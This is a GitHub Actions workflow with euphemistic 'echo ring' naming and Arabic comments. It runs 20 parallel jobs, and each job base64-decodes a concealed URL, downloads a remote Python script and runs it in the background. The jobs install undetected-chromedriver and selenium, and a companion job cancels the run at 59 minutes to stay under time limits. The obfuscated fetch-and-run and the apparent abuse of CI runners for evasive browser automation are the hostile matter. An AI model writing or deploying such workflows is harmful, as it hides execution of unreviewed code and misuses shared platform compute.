name: Halcyon Echo Deployment Ring

on:
  workflow_dispatch:

concurrency:
  group: halcyon-ring-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # الضابط الحصيف: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
  # =================================================================
  prudent-commander:
    name: "Prudent Commander"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Position Commander Watch
        run: |
          echo "[COMMANDER] Prudent commander in place. Watch stationed at the 59-minute perimeter."
          echo "[COMMANDER] Run badge registered: ${{ github.run_id }}"
          
          # فترة المتابعة المحددة (3540 ثانية = 59 دقيقة)
          sleep 3540
          
          echo "[COMMANDER] Perimeter reached! Dispatching commander order..."
          
          # إرسال أمر الإلغاء عبر GitHub API
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[COMMANDER] Order dispatched. Every running and scheduled echo will be silenced."

  # =================================================================
  # حلقة الصدى المتوازية: تشكيل وتشغيل عُقد الصدى
  # =================================================================
  echo-ring:
    name: "EchoNode-${{ matrix.echo_marker }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        echo_marker: [901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920]

    steps:
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور Ⅰ: تأسيس القاعدة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Found Base Layer
        run: |
          echo "[FOUND] Founding base layer for EchoNode-${{ matrix.echo_marker }} on Linux..."
          sudo apt update -qq
          sudo apt install -y curl python3-pip

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور Ⅱ: استلام الشيفرة التشغيلية
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Receive Operational Code
        run: |
          echo "[RECEIVE] Receiving echo_script.py from designated pathway..."
          PATHWAY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$PATHWAY" -o echo_script.py
          echo "[RECEIVE] Operational code received."

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور Ⅲ: تجميع المكتبات الداعمة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Gather Support Libraries
        run: |
          echo "[GATHER] Gathering support libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطور Ⅳ: التنفيذ المقيّد بـ 59 دقيقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Trigger Echo Pulse
        run: |
          echo ">> Triggering EchoNode-${{ matrix.echo_marker }} pulse..."
          
          # تشغيل العملية في الخلفية
          python3 echo_script.py &
          ECHO_PID=$!
          
          echo ">> Echo pulse triggered. Boundary: 59 minutes (3540s)."
          
          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
          sleep 3540
          
          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
          if kill -0 $ECHO_PID 2>/dev/null; then
            echo ">> Boundary reached! Quenching pulse..."
            kill -9 $ECHO_PID
            echo ">> Pulse quenched by boundary keeper."
          else
            echo ">> Pulse faded within boundary."
          fi
